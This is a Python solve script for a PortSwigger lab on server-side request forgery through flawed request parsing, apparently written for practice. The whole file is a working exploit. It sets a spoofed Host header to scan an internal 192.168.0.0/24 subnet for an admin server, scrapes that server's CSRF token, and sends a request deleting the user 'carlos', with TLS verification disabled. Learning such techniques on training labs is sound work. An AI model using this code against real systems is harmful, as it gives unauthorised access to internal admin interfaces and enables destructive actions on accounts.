#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: SSRF via flawed request parsing.

The proxy validates the absolute URL host (must be the legitimate lab domain)
but routes based on the Host header. Setting Host to an internal IP bypasses
access controls while the absolute URL passes validation.

Attack pattern:
  GET https://<lab>/admin HTTP/1.1
  Host: 192.168.0.X
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def scan_internal(lab, session_cookie, lab_cookie, subnet="192.168.0", timeout=5):
    """Scan for the internal admin server by checking response lengths."""
    print(f"[*] Scanning {subnet}.0/24 ...")
    cookies = {"session": session_cookie, "_lab": lab_cookie}
    baseline = None
    findings = {}

    for i in range(0, 256):
        ip = f"{subnet}.{i}"
        try:
            r = requests.get(
                f"{lab}/admin",
                headers={"Host": ip},
                cookies=cookies,
                verify=False,
                timeout=timeout,
            )
            length = len(r.content)
            if baseline is None:
                baseline = length
            if length != baseline or r.status_code == 200:
                print(f"[!] {ip} → status={r.status_code} length={length}  ← DIFFERENT")
                findings[ip] = (r.status_code, length)
            else:
                print(f"    {ip} → {r.status_code} len={length}")
        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.ConnectionError:
            pass

    return findings


def fetch_csrf(lab, internal_ip, session_cookie, lab_cookie):
    cookies = {"session": session_cookie, "_lab": lab_cookie}
    r = requests.get(
        f"{lab}/admin",
        headers={"Host": internal_ip},
        cookies=cookies,
        verify=False,
    )
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return m.group(1) if m else None


def delete_carlos(lab, internal_ip, csrf_token, session_cookie, lab_cookie):
    cookies = {"session": session_cookie, "_lab": lab_cookie}
    r = requests.get(
        f"{lab}/admin/delete",
        headers={"Host": internal_ip},
        params={"csrf": csrf_token, "username": "carlos"},
        cookies=cookies,
        verify=False,
    )
    return r.status_code


def main():
    parser = argparse.ArgumentParser(
        description="Solve SSRF via Flawed Request Parsing lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("session", help="session cookie value")
    parser.add_argument("lab_cookie", help="_lab cookie value")
    parser.add_argument("--internal-ip", help="Known internal admin IP (skips scan)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")

    internal_ip = args.internal_ip
    if not internal_ip:
        findings = scan_internal(lab, args.session, args.lab_cookie)
        if not findings:
            print("[-] No internal server found.")
            return
        internal_ip = list(findings.keys())[0]

    print(f"\n[*] Targeting internal admin at {internal_ip}")
    csrf = fetch_csrf(lab, internal_ip, args.session, args.lab_cookie)
    if not csrf:
        print("[-] CSRF token not found.")
        return
    print(f"[+] CSRF token: {csrf}")

    status = delete_carlos(lab, internal_ip, csrf, args.session, args.lab_cookie)
    if status in (200, 302):
        print("[+] Carlos deleted — lab solved!")
    else:
        print(f"[-] Delete returned {status}")


if __name__ == "__main__":
    main()
